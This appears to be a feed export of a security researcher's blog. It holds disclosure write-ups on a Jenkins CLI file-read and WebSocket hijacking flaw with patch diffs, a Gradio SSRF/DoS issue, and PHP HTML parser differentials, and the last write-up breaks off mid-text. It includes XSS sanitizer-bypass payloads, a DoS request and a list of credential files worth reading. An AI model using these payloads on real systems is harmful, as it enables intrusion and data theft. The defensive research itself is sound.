&#125;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">FullDuplexHttpService</span> <span class="variable">service</span> <span class="operator">=</span> services.get(uuid);</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                service.upload(req, rsp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This function requires a downloader and uploader. The downloader returns the command’s response, and the uploader invokes a specified command from the body of the request. Jenkins connects them (downloader and uploader) using the UUID from the <code>​​Session</code> header.</p><h1 id="Data-Leak-Vulnerability-CVE-2024-23897"><a href="#Data-Leak-Vulnerability-CVE-2024-23897" class="headerlink" title="Data Leak Vulnerability (CVE-2024-23897)"></a>Data Leak Vulnerability (CVE-2024-23897)</h1><p>When invoking a CLI command with arguments, we have noticed that Jenkins uses <a href="https://github.com/kohsuke/args4j">args4j’s</a> <a href="https://github.com/jenkinsci/jenkins/blob/3b0de10df3bedba515e13032104d4d84f83045be/core/src/main/java/hudson/cli/CLICommand.java#L248">parseArgument</a>, which <a href="https://github.com/kohsuke/args4j/blob/fc458a24d6bd08b58fdd0bd7e37acb08200eac59/args4j/src/org/kohsuke/args4j/CmdLineParser.java#L479">calls</a> <a href="https://github.com/kohsuke/args4j/blob/fc458a24d6bd08b58fdd0bd7e37acb08200eac59/args4j/src/org/kohsuke/args4j/CmdLineParser.java#L548">expandAtFiles</a>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String[] expandAtFiles(String args[]) <span class="keyword">throws</span> CmdLineException &#123;</span><br><span class="line">    List&lt;String&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String arg : args) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arg.startsWith(<span class="string">&quot;@&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(arg.substring(<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">if</span> (!file.exists())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmdLineException</span>(<span class="built_in">this</span>,Messages.NO_SUCH_FILE,file.getPath());</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                result.addAll(readAllLines(file));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmdLineException</span>(<span class="built_in">this</span>, <span class="string">&quot;Failed to parse &quot;</span>+file,ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.add(arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[result.size()]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The function checks if the argument starts with the <code>@</code> character, and if so, it reads the file in the path after the <code>@</code> and expands a new argument for each line. </p><img src="/img/blogs/jenkins/image_2.webp" style="width: 100%;"/><p>This means that if an attacker can control an argument, they can expand it to an arbitrary number of ones from an arbitrary file on the Jenkins instance.</p><p>One way an attacker could leverage this is to find a command that takes an arbitrary number of arguments and displays these back to the user. Since the arguments are populated from the contents of the file, an attacker could leak the file contents this way. We found the command <a href="https://github.com/jenkinsci/jenkins/blob/jenkins-2.441/core/src/main/java/hudson/cli/ConnectNodeCommand.java">connect-to-node</a> to be a good candidate: it receives a <a href="https://github.com/jenkinsci/jenkins/blob/824f64c23e52e5c765cc7604414740aab3436f8d/core/src/main/java/hudson/cli/ConnectNodeCommand.java#L46">list of strings as an argument</a> and tries to connect to each one. If it fails, an error message is generated with the name of the failed connected node. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConnectNodeCommand</span> <span class="keyword">extends</span> <span class="title class_">CLICommand</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="meta">@Argument(metaVar = &quot;NAME&quot;, usage = &quot;Agent name, or empty string for built-in node; comma-separated list is supported&quot;, required = true, multiValued = true)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; nodes;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">for</span> (String node_s : hs) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Computer</span> <span class="variable">computer</span> <span class="operator">=</span> Computer.resolveForCLI(node_s);</span><br><span class="line">                computer.cliConnect(force);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> node_s + <span class="string">&quot;: &quot;</span> + e.getMessage();</span><br><span class="line">                stderr.println(errorMsg);</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This <a href="https://github.com/jenkinsci/jenkins/blob/jenkins-2.441/core/src/main/java/hudson/cli/ConnectNodeCommand.java">connect-to-node</a> command would usually require the CONNECT permission, which is verified in the <a href="https://github.com/jenkinsci/jenkins/blob/3b0de10df3bedba515e13032104d4d84f83045be/core/src/main/java/hudson/model/Computer.java#L483">cliConnect</a> function. But since the exception is thrown before the permission check in the <a href="https://github.com/jenkinsci/jenkins/blob/3b0de10df3bedba515e13032104d4d84f83045be/core/src/main/java/hudson/model/Computer.java#L1676">resolveForCLI</a> function, the command actually doesn’t require any authorizations apart from the initial <a href="https://github.com/jenkinsci/jenkins/blob/3b0de10df3bedba515e13032104d4d84f83045be/core/src/main/java/hudson/cli/CLICommand.java#L247">read-only verification</a>.</p><p>Achieving code execution from arbitrary file read is dependent on the context. Some potentially interesting files for attackers could be:</p><ul><li>SSH keys</li><li>&#x2F;etc&#x2F;passwd, &#x2F;etc&#x2F;shadow</li><li>Project secrets and credentials (refer to Jenkins’ <a href="https://www.jenkins.io/security/advisory/2024-01-24/">advisory</a> for more information)</li><li>Source code, build artifacts</li><li>and more…</li></ul><h3 id="Binary-Files-Reading-Limitations"><a href="#Binary-Files-Reading-Limitations" class="headerlink" title="Binary Files Reading Limitations"></a>Binary Files Reading Limitations</h3><p>When a file is read, the process’s default character encoding is used, which is UTF-8 for most deployments. Because of this, any invalid UTF-8 sequence (statistically almost 50% of all bytes, assuming an equal distribution) would be replaced by the sequence <code>0xef 0xbf 0xbd</code> and cause data loss.<br>Some other encodings (such as Windows-1252, commonly used by instances running on Windows) would make it more feasible to exfiltrate binary data.</p><h1 id="CSWSH-Vulnerability-CVE-2024-23898"><a href="#CSWSH-Vulnerability-CVE-2024-23898" class="headerlink" title="CSWSH Vulnerability (CVE-2024-23898)"></a>CSWSH Vulnerability (CVE-2024-23898)</h1><p>As mentioned earlier, one of the ways to invoke the <a href="https://www.jenkins.io/doc/book/managing/cli/">Jenkins-CLI</a> commands is by web sockets (which is the implementation of <code>jenkins-cli.jar</code>).</p><p>It is known that browsers don’t enforce SOP and CORS policies on WebSockets: “Cross-origin restrictions imposed by SOP and CORS policies do not apply to WebSockets because those restrictions are placed on HTTP responses while WebSockets work over WS(WebSocket) or WSS(WebSocketSecure) protocols.” (<a href="https://dev.to/pssingh21/websockets-bypassing-sop-cors-5ajm">source</a>).</p><p>Since there is no Jenkins-crumb (CSRF token) nor Origin header check in the web sockets requests, any website can use <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API">WebSockets</a> to invoke Jenkins-CLI commands with the victim’s identity, in a similar fashion to CSRF vulnerabilities.</p><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>The Jenkins security team patched CVE-2024-23897 by adding a secure configuration, which disables the “<a href="https://github.com/kohsuke/args4j/blob/fc458a24d6bd08b58fdd0bd7e37acb08200eac59/args4j/src/org/kohsuke/args4j/CmdLineParser.java#L478">expandAtFiles</a>” feature.</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+  public static boolean ALLOW_AT_SYNTAX = SystemProperties.getBoolean(CLICommand.class.getName() + &quot;.allowAtSyntax&quot;);</span></span><br><span class="line">//...</span><br><span class="line"><span class="deletion">-    return new CmdLineParser(this);</span></span><br><span class="line"><span class="addition">+    ParserProperties properties = ParserProperties.defaults().withAtSyntax(ALLOW_AT_SYNTAX);</span></span><br><span class="line"><span class="addition">+    return new CmdLineParser(this, properties);</span></span><br></pre></td></tr></table></figure><p>And CVE-2024-23898 was patched by adding an origin verification to the WebSocket endpoint (The <code>ALLOW</code> parameter serves as a toggle, granting administrators the ability to override the updated default behavior. Giving the option to consistently permit or deny access to the WS CLI, irrespective of the Origin):</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public HttpResponse doWs(StaplerRequest req) &#123;</span><br><span class="line">    if (!WebSockets.isSupported()) &#123;</span><br><span class="line">        return HttpResponses.notFound();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="addition">+    if (ALLOW == null) &#123;</span></span><br><span class="line"><span class="addition">+        final String actualOrigin = req.getHeader(&quot;Origin&quot;);</span></span><br><span class="line"><span class="addition">+        final String expectedOrigin = StringUtils.removeEnd(StringUtils.removeEnd(+Jenkins.get().getRootUrlFromRequest(), &quot;/&quot;), req.getContextPath());</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        if (actualOrigin == null || !actualOrigin.equals(expectedOrigin)) &#123;</span></span><br><span class="line"><span class="addition">+            LOGGER.log(Level.FINE, () -&gt; &quot;Rejecting origin: &quot; + actualOrigin + &quot;; expected was from request: &quot; + +expectedOrigin);</span></span><br><span class="line"><span class="addition">+            return HttpResponses.forbidden();</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+    &#125; else if (!ALLOW) &#123;</span></span><br><span class="line"><span class="addition">+        return HttpResponses.forbidden();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line">    Authentication authentication = Jenkins.getAuthentication2();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2023&#x2F;11&#x2F;13</td><td>We reported all issues to the Jenkins Security team</td></tr><tr><td>2023&#x2F;11&#x2F;13</td><td>Maintainers acknowledged the report</td></tr><tr><td>2023&#x2F;11&#x2F;24</td><td>Maintainers confirmed the issues</td></tr><tr><td>2023&#x2F;12&#x2F;12</td><td>We helped the vendor verify the fix</td></tr><tr><td>2024&#x2F;01&#x2F;10</td><td>Maintainers updated us on other attack scenarios and the classification of Critical and High for our findings</td></tr><tr><td>2024&#x2F;01&#x2F;24</td><td>Maintainers assigned CVEs, and released <a href="https://www.jenkins.io/security/advisory/2024-01-24/">advisory</a> and patch versions 2.442, and LTS 2.426.3.</td></tr></tbody></table><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In this blog, we uncovered two vulnerabilities on Jenkins, the first one leverages the “<a href="https://github.com/kohsuke/args4j/blob/fc458a24d6bd08b58fdd0bd7e37acb08200eac59/args4j/src/org/kohsuke/args4j/CmdLineParser.java#L479">expandAtFiles</a>” functionality to read arbitrary files and eventually execute arbitrary code on the server. The second finding has the potential to execute arbitrary commands as the victim, by manipulating them to visit a malicious link.</p><p>At Sonar, we emphasize the importance of Clean Code principles. Doing so creates software characterized by clarity, maintainability, and comprehensibility. These attributes not only help the identification and resolution of vulnerabilities throughout the development process but also lower the likelihood of introducing security weaknesses that malicious actors might exploit.</p><p>Lastly, we would like to give huge kudos to the Jenkins team, who quickly and professionally assessed our findings, maintained great communication throughout the disclosure process, and provided a comprehensive fix. Thank you!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Key-Information&quot;&gt;&lt;a href=&quot;#Key-Information&quot; class=&quot;headerlink&quot; title=&quot;Key Information&quot;&gt;&lt;/a&gt;Key Information&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Sonar’s Vuln</summary>
      
    
    
    
    
    <category term="java" scheme="https://yaniv-git.github.io/tags/java/"/>
    
    <category term="rce" scheme="https://yaniv-git.github.io/tags/rce/"/>
    
    <category term="arbitrary file read" scheme="https://yaniv-git.github.io/tags/arbitrary-file-read/"/>
    
    <category term="jenkins" scheme="https://yaniv-git.github.io/tags/jenkins/"/>
    
  </entry>
  
  <entry>
    <title>SSRF in Gradio</title>
    <link href="https://yaniv-git.github.io/2023/12/20/SSRF%20in%20Gradio/"/>
    <id>https://yaniv-git.github.io/2023/12/20/SSRF%20in%20Gradio/</id>
    <published>2023-12-20T23:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.241Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Older versions of <code>gradio</code> contained a vulnerability in the <code>/file</code> route which made them susceptible to file traversal attacks in which an attacker could access arbitrary files on a machine running a Gradio app with a public URL (e.g. if the demo was created with <code>share=True</code>, or on Hugging Face Spaces) if they knew the path of files to look for.</p><p>This was not possible through regular URLs passed into a browser, but it was possible through the use of programmatic tools such as <code>curl</code> with the <code>--pass-as-is</code> flag.</p><p>Furthermore, the <code>/file</code> route in Gradio apps also contained a vulnerability that made it possible to use it for SSRF attacks.</p><h1 id="Explotation"><a href="#Explotation" class="headerlink" title="Explotation"></a>Explotation</h1><p>The exploitation of this vulnerability is highly context&#x2F;infrastructure dependent. We found out that it is possible to DoS the gradio’s server simply by running the following request:<br><code>http://gradio-domain/file=http://gradio-domain</code></p><h1 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h1><p>Both of these vulnerabilities have been fixed in <code>gradio==4.11.0</code></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2">Github’s Advisory</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h1&gt;&lt;p&gt;Older versions of &lt;code&gt;gradio&lt;/co</summary>
      
    
    
    
    
    <category term="ssrf" scheme="https://yaniv-git.github.io/tags/ssrf/"/>
    
    <category term="dos" scheme="https://yaniv-git.github.io/tags/dos/"/>
    
  </entry>
  
  <entry>
    <title>PHP HTML parser differential due to libxml2 lack of HTML5 support</title>
    <link href="https://yaniv-git.github.io/2023/11/28/PHP%20HTML%20parser%20differential%20due%20to%20libxml2%20lack%20of%20HTML5%20support/"/>
    <id>https://yaniv-git.github.io/2023/11/28/PHP%20HTML%20parser%20differential%20due%20to%20libxml2%20lack%20of%20HTML5%20support/</id>
    <published>2023-11-28T23:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.241Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>The default HTML parser of PHP uses the underlying package libxml2 (<a href="https://github.com/php/php-src/blob/master/ext/dom/document.c#L1920">for example here</a>). Libxml2 doesn’t <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/211">currently support</a> HTML5 parsing, and while it is undergoing process, after contacting them about this matter they said it will take a while before implementing this feature. This means that the built-in HTML parser of PHP behind <a href="https://www.php.net/manual/en/domdocument.loadhtml.php">loadHTML</a>, <a href="https://www.php.net/manual/en/class.domimplementation.php">DOMImplementation</a>, etc. does not follow the same parsing rules as modern web browsers.<br>This behaviour becomes security-relevant when HTML sanitizers use the built-in HTML parser.<br>We have come across multiple PHP sanitizers that are vulnerable to bypasses due to using the built-in parser, and we think that the root cause can’t be addressed without significant changes by libxml2.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>Here are some examples of how attackers can leverage these parsing differentials in order to bypass sanitizers.</p><h4 id="1-Comments"><a href="#1-Comments" class="headerlink" title="1. Comments:"></a>1. Comments:</h4><p>According to the <a href="https://www.w3.org/TR/xml/#sec-comments">XML specification</a> (XHTML), comments must end with the characters <code>—&gt;</code>. On the other hand, the <a href="https://html.spec.whatwg.org/multipage/syntax.html#comments">HTML specification</a> states that a comment’s text “must not start with the string <code>&gt;</code>, nor start with the string <code>-&gt;</code>”.<br>When parsing the following string in a browser, the comment will end before the <code>p</code> tag. But when parsing with PHP the <code>p</code> tag will be considered <code>a</code> comment:</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &lt;!--&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">Browser (HTML specification) output: <span class="comment">&lt;!----&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">PHP parser (XHTML specification) output: <span class="comment">&lt;!--&gt;</span></span><span class="language-xml"><span class="comment">&lt;p&gt;--&gt;</span></span></span><br></pre></td></tr></table></figure><p>This can be done with either <code>&lt;!--&gt;</code> or <code>&lt;!---&gt;</code>.<br>An attacker can input the following payload <code>&lt;!--&gt;&lt;xss&gt;--&gt;</code>. While the parser considers the xss tag as a comment, the browser will end the comment right before and render the xss tag as expected.</p><h4 id="2-RCDATA-RAWTEXT-elements"><a href="#2-RCDATA-RAWTEXT-elements" class="headerlink" title="2. RCDATA&#x2F;RAWTEXT elements"></a>2. RCDATA&#x2F;RAWTEXT elements</h4><p>In <a href="https://html.spec.whatwg.org/#parsing-html-fragments">HTML5</a>, other element parsing types were introduced: </p><ul><li>RCDATA<ul><li>textarea</li><li>title</li></ul></li><li>RAWTEXT<ul><li>noframes</li><li>noembed</li><li>iframe</li><li>xmp</li><li>style</li></ul></li><li>OTHERS<ul><li>noscript - depends if <a href="https://html.spec.whatwg.org/#the-noscript-element">scripting</a> is enabled (enabled by default in browsers).</li><li>plaintext</li><li>script</li></ul></li></ul><p>While the PHP’s parser is oblivious to that. There are multiple ways an attacker can bypass a sanitizer due to wrong parsing such as:</p><ul><li><code>&lt;iframe&gt;&lt;!--&lt;/iframe&gt;&lt;xss&gt;--&gt;&lt;/iframe&gt;</code></li><li><code>&lt;noframes&gt;&lt;style&gt;&lt;/noframes&gt;&lt;xss&gt;&lt;/style&gt;&lt;/noframes&gt;</code></li><li>…</li></ul><h4 id="3-Foreign-content-elements"><a href="#3-Foreign-content-elements" class="headerlink" title="3. Foreign content elements"></a>3. Foreign content elements</h4><p>HTML5 introduced two foreign elements (<a href="https://html.spec.whatwg.org/#mathml">math</a> and <a href="https://html.spec.whatwg.org/#svg-0">svg</a>) which follow different parsing specifications than HTML. Again parsing with PHP doesn’t take it into account, causing other parsing differentials and sanitizers bypass such as:</p><ul><li><code>&lt;svg&gt;&lt;p&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;xss&gt;--&gt;&lt;/style&gt;</code> </li><li>…</li></ul><h4 id="4-DOCTYPE-element"><a href="#4-DOCTYPE-element" class="headerlink" title="4. DOCTYPE element"></a>4. DOCTYPE element</h4><p>The <code>!DOCTYPE</code> <a href="https://www.w3.org/TR/xml/#NT-doctypedecl">element in XML&#x2F;XHTML</a> is more complex allowing more characters and element nesting than in <a href="https://html.spec.whatwg.org/#the-doctype">HTML5</a>. In contrast, the HTML doctype ends with the <a href="https://html.spec.whatwg.org/#doctype-state">first occurrence</a> of the “greater than” sign <code>&gt;</code>.<br>Parsing the following string will render an xss tag in the browser but not in PHP:</p><ul><li><code>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTDHTML4.01//EN&quot; &quot;&gt;&lt;xss&gt;&quot;&gt;</code> </li><li><code>&lt;!DOCTYPE HTML SYSTEM &quot;&gt;&lt;xss&gt;&quot;&gt;</code></li></ul><h4 id="5-Element-name-starting-with-underscrool"><a href="#5-Element-name-starting-with-underscrool" class="headerlink" title="5. Element name starting with underscrool"></a>5. Element name starting with underscrool</h4><p>According to the <a href="https://www.w3schools.com/xml/xml_elements.asp#:~:text=can%20have%20attributes.-,XML%20Naming%20Rules,-XML%20elements%20must">XML specification</a> <code>Element names must start with a letter or underscore</code>, unlike <a href="https://html.spec.whatwg.org/#syntax-tag-name">HTML</a> where tags must start with ASCII alphanumerics.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">_test</span>&gt;</span>/<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">HTML output: <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="symbol">&amp;lt;</span>_test/<span class="symbol">&amp;gt;</span>/<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">XML output: <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">_test</span>/&gt;</span>/<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>Sanitizers using the built-in PHP parser are inherently vulnerable to bypass due to wrong parsing.</p><h3 id="Recommendation"><a href="#Recommendation" class="headerlink" title="Recommendation"></a>Recommendation</h3><p>This issue is <a href="https://wiki.php.net/rfc/domdocument_html5_parser">known</a> but isn’t clear for users of PHP, after this report the PHP team added a red warning to the documentation:</p><ul><li><a href="https://www.php.net/manual/en/domdocument.loadhtml.php">loadhtml</a></li><li><a href="https://www.php.net/manual/en/domdocument.loadhtmlfile.php">loadhtmlfile</a></li><li><a href="https://github.com/php/doc-en/commit/4ef716f8aa753e1189b2e57c91da378b16d970b0">Commit</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h3&gt;&lt;p&gt;The default HTML parser of PHP uses the underlying</summary>
      
    
    
    
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="mxss" scheme="https://yaniv-git.github.io/tags/mxss/"/>
    
    <category term="bypass" scheme="https://yaniv-git.github.io/tags/bypass/"/>
    
    <category term="parser differential" scheme="https://yaniv-git.github.io/tags/parser-differential/"/>
    
  </entry>
  
  <entry>
    <title>Masterminds/html5-php parser differential</title>
    <link href="https://yaniv-git.github.io/2023/11/13/Masterminds%20html5-php%20parser%20differential/"/>
    <id>https://yaniv-git.github.io/2023/11/13/Masterminds%20html5-php%20parser%20differential/</id>
    <published>2023-11-13T23:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.240Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h2><p>We have noticed a number of parsing differences between the Masterminds&#x2F;html5-php parser and the HTML5 specification. We think that the root cause of those issues drills down to the <a href="https://github.com/Masterminds/html5-php/blob/master/src/HTML5/Parser/DOMTreeBuilder.php#L172">use</a> of PHP’s default parser, <a href="https://www.php.net/manual/en/domdocument.loadhtml.php">loadHTML</a>, <a href="https://www.php.net/manual/en/class.domimplementation.php">DOMImplementation</a>, etc. The lack of HTML5 support by PHP is <a href="https://wiki.php.net/rfc/domdocument_html5_parser">known</a> and we contacted them asking to make it more clear in the <a href="https://www.php.net/manual/en/domdocument.loadhtml.php">documentation</a> in order to raise awareness for these security issues.<br>This behavior becomes security-relevant when HTML sanitizers use the Masterminds&#x2F;html5-php parser. We have come across multiple PHP sanitizers that are vulnerable to bypasses due to using Masterminds&#x2F;html5-php.</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Here are examples of the differentials, and how attackers can leverage these in order to bypass sanitizers.</p><h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments:"></a>Comments:</h3><p>According to the <a href="https://www.w3.org/TR/xml/#sec-comments">XML specification</a> (XHTML), comments must end with the characters <code>--&gt;</code>.<br>On the other hand, the <a href="https://html.spec.whatwg.org/multipage/syntax.html#comments">HTML specification</a> states that a comment’s text <em>‘must not start with the string <code>&gt;</code>, nor start with the string <code>-&gt;</code>‘</em>.<br>When parsing the following string in a browser, the comment will end before the <code>p</code> tag. But when parsing with <code>Masterminds/html5-php</code> the <code>p</code> tag will be considered a comment:</p><ul><li>Input: <code>&lt;!---&gt;&lt;p&gt;</code></li><li>Browser (HTML5 specification) output: <code>&lt;!----&gt;&lt;p&gt;&lt;/p&gt;</code></li><li>Masterminds&#x2F;html5-php parser output: <code>&lt;!---&gt;&lt;p&gt;--&gt;</code></li></ul><p>An attacker can input the following payload <code>&lt;!---&gt;&lt;xss&gt;--&gt;</code>. While the parser considers the <code>xss</code> tag as a comment, the browser will end the comment right before and render the <code>xss</code> tag as expected.</p><h3 id="Processing-instructions-PI-elements-known-but-we-encounter-sanitizer-bypasses-due-to-this"><a href="#Processing-instructions-PI-elements-known-but-we-encounter-sanitizer-bypasses-due-to-this" class="headerlink" title="Processing instructions (PI) elements (known, but we encounter sanitizer bypasses due to this)"></a>Processing instructions (PI) elements (<a href="https://github.com/Masterminds/html5-php#known-issues-or-things-we-designed-against-the-spec">known</a>, but we encounter sanitizer bypasses due to this)</h3><p>Processing instructions elements exist in <a href="https://www.w3.org/TR/xml/#sec-pi">XML specification</a> but in <a href="https://html.spec.whatwg.org/#determining-the-character-encoding:~:text=A%20sequence%20of%20bytes%20starting%20with%3A%200x3C%200x3F%20(%60%3C%3F%60)">HTML5</a> the characters <code>&lt;?</code> opens a comment and ends it at the first occurrence of greater than <code>&gt;</code>.</p><p>Attackers can create the following Processing Instruction <code>&lt;?xml &gt;s&lt;img src=x onerror=alert(1)&gt; ?&gt;</code> and while no <code>img</code> tag is rendered in Masterminds&#x2F;html5-php the browser will create a comment and end it at the first <code>&gt;</code> character, rendering the <code>img</code> tag.</p><h3 id="Foreign-content-elements"><a href="#Foreign-content-elements" class="headerlink" title="Foreign content elements"></a>Foreign content elements</h3><p>HTML5 introduced two foreign elements (<a href="https://html.spec.whatwg.org/#mathml">math</a> and <a href="https://html.spec.whatwg.org/#svg-0">svg</a>) which follow different parsing specifications than HTML. Masterminds&#x2F;html5-php doesn’t take it into account, causing other parsing differentials and <a href="https://research.securitum.com/dompurify-bypass-using-mxss/">sanitizers bypass</a> such as:</p><ul><li><code>&lt;svg&gt;&lt;p&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;xss&gt;--&gt;&lt;/style&gt;</code></li></ul><h3 id="noscript-element"><a href="#noscript-element" class="headerlink" title="noscript element"></a><code>noscript</code> element</h3><p>Depending if <a href="https://html.spec.whatwg.org/#the-noscript-element">scripting</a> is enabled (enabled by default in browsers) the <code>noscript</code> element parses its content differently:</p><ul><li>If scripting is enabled, then the content is rendered as raw data</li><li>If scripting is disabled, then the content is rendered as HTML</li></ul><p>Masterminds&#x2F;html5-php parses according to disabled scripting, which is different than the default browsers’ parsing.<br>This is not wrong per se, but still can cause some <a href="https://cure53.de/fp170.pdf">mXSS</a> such as:<br><code>&lt;noscript&gt;&lt;p 